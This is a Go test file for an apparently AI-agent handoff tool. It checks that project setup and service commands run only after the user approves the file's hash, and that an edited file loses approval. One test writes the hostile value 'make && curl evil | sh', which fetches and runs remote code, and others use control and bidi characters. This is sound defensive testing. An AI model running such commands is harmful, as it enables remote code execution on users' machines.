package main

import (
	"context"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"
)

func TestAProjectFileTakesSetupServicesAndPortsOnly(t *testing.T) {
	p, err := parseProject([]byte("setup = \"pnpm install\"\nservices = [\"pnpm dev\", \"pnpm worker\"]\n"))
	if err != nil || p.Setup != "pnpm install" || strings.Join(p.Services, ",") != "pnpm dev,pnpm worker" {
		t.Fatalf("project = %+v, %v", p, err)
	}
	if p, err := parseProject([]byte("ports = [3000, 5173]\n")); err != nil || !slices.Equal(p.Ports, []int{3000, 5173}) {
		t.Fatalf("ports alone = %+v, %v", p, err)
	}
	for body, want := range map[string]string{
		"setup = \"x\"\nbuild = \"y\"\n": "unknown key",
		"":                               "no setup, services or ports",
		"services = [\"\"]\n":            "can't be empty",
		"setup = [\n":                    projectFile,
		"setup = \"  \"\n":               "setup can't be empty",
		"setup = \"make\\u001b[2K\"\n":   "control",
		"services = [\"rm -rf build \\u202e\"]\n": "format characters",
		"ports = [0]\n":          "isn't a port",
		"ports = [70000]\n":      "isn't a port",
		"ports = [3000, 3000]\n": "listed twice",
	} {
		if _, err := parseProject([]byte(body)); err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("parseProject(%q) = %v, want an error about %q", body, err, want)
		}
	}
}

func TestAllowApprovesThatFileInThatProjectOnly(t *testing.T) {
	f := newFixture(t)
	body := "setup = \"make\"\n"
	f.write(f.local, projectFile, body)
	f.write(f.remote, projectFile, body)
	approved := func(root string) bool {
		t.Helper()
		p, err := approvedProject(f.machine(), root)
		if p == nil && err == nil {
			t.Fatalf("no project file at %s", root)
		}
		return err == nil
	}
	p, err := readProject(f.local)
	if err != nil {
		t.Fatal(err)
	}
	if p, err := approvedProject(f.machine(), f.local); p != nil || err == nil || !strings.Contains(err.Error(), `It has setup "make".`) || !strings.Contains(err.Error(), "call allow_project with dir "+f.local+" and sha256 ") {
		t.Fatalf("a new project file: %+v, %v", p, err)
	}
	if text, failed := f.call("allow_project", map[string]any{"dir": filepath.Join(f.local, "deep"), "sha256": ""}); !failed {
		t.Fatalf("allowed a folder that doesn't exist: %s", text)
	}
	if text, failed := f.call("allow_project", map[string]any{"dir": f.local, "sha256": strings.Repeat("0", 64)}); !failed || !strings.Contains(text, "isn't what the user saw") || approved(f.local) {
		t.Fatalf("a wrong sha256: %s", text)
	}
	f.answer = "decline"
	if text, failed := f.call("allow_project", map[string]any{"dir": f.local, "sha256": p.Hash}); failed || !strings.Contains(text, "didn't allow it") || approved(f.local) {
		t.Fatalf("when the user declines: %s", text)
	}
	f.answer = "accept"
	f.allow(f.local)
	if !approved(f.local) {
		t.Fatal("after allow_project it still wasn't approved")
	}
	if len(f.asked) != 2 || !strings.Contains(f.asked[1], `It has setup "make".`) {
		t.Errorf("the user was asked %q", f.asked)
	}
	if approved(f.remote) {
		t.Error("approving one project's file also approved the same file in another project")
	}
	f.write(f.local, projectFile, "setup = \"make && curl evil | sh\"\n")
	if approved(f.local) {
		t.Error("an edited project file stayed approved")
	}
	f.allow(f.local)
	f.write(f.local, projectFile, body)
	if approved(f.local) {
		t.Error("an older version stayed approved after a newer one was allowed")
	}
}

func TestAnUnapprovedProjectFileRunsNothing(t *testing.T) {
	f := newFixture(t)
	f.write(f.local, projectFile, "setup = \"echo ran > setup.txt\"\n")
	res, err := f.handoffToServer("0f0f0f0f-1111-2222-3333-999999999990").Run(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(res.Noted(), "call allow_project with dir "+f.local) {
		t.Errorf("notes = %q", res.Noted())
	}
	if waitForFile(t, filepath.Join(f.remote, "setup.txt"), 2*time.Second) {
		t.Error("an unapproved setup ran")
	}
}

func TestServicesStartOnlyAfterSetupSucceeds(t *testing.T) {
	f := newFixture(t)
	f.write(f.local, projectFile, "setup = \"sleep 1 && echo ready > setup.txt\"\nservices = [\"cat setup.txt > served.tmp && mv served.tmp served.txt\"]\n")
	f.allow(f.local)
	id := "0f0f0f0f-1111-2222-3333-999999999991"
	if res, err := f.handoffToServer(id).Run(context.Background()); err != nil || len(res.Notes) > 0 {
		t.Fatalf("handoff: %v, notes %q", err, res.Noted())
	}
	if !waitForFile(t, filepath.Join(f.remote, "served.txt"), 10*time.Second) {
		t.Fatal("the service never started")
	}
	if got := strings.TrimSpace(f.read(f.remote, "served.txt")); got != "ready" {
		t.Errorf("the service started before setup finished: served.txt = %q", got)
	}
	if got := strings.TrimSpace(f.read(filepath.Join(f.home, ".magi", "setup"), id)); got != "ok" {
		t.Errorf("setup status = %q", got)
	}
	panes, _ := exec.Command("tmux", "list-panes", "-a", "-F", "#{window_name}").Output()
	if got := strings.Count(string(panes), "api · claude"); got != 3 {
		t.Errorf("the Claude tab has %d panes, want Claude, setup and the service:\n%s", got, panes)
	}
}

func TestAFailedSetupKeepsServicesFromStarting(t *testing.T) {
	f := newFixture(t)
	f.write(f.local, projectFile, "setup = \"exit 3\"\nservices = [\"echo up > served.txt\"]\n")
	f.allow(f.local)
	id := "0f0f0f0f-1111-2222-3333-999999999992"
	if _, err := f.handoffToServer(id).Run(context.Background()); err != nil {
		t.Fatal(err)
	}
	status := filepath.Join(f.home, ".magi", "setup", id)
	deadline := time.Now().Add(10 * time.Second)
	for f.read(filepath.Dir(status), id) == "" && time.Now().Before(deadline) {
		time.Sleep(100 * time.Millisecond)
	}
	if got := strings.TrimSpace(f.read(filepath.Dir(status), id)); got != "failed" {
		t.Fatalf("setup status = %q", got)
	}
	if waitForFile(t, filepath.Join(f.remote, "served.txt"), 2*time.Second) {
		t.Error("a service started although setup failed")
	}
}

func TestServicesWithoutSetupStartRightAway(t *testing.T) {
	f := newFixture(t)
	f.write(f.local, projectFile, "services = [\"echo up > served.txt\"]\n")
	f.allow(f.local)
	if _, err := f.handoffToServer("0f0f0f0f-1111-2222-3333-999999999993").Run(context.Background()); err != nil {
		t.Fatal(err)
	}
	if !waitForFile(t, filepath.Join(f.remote, "served.txt"), 10*time.Second) {
		t.Error("the service never started")
	}
}
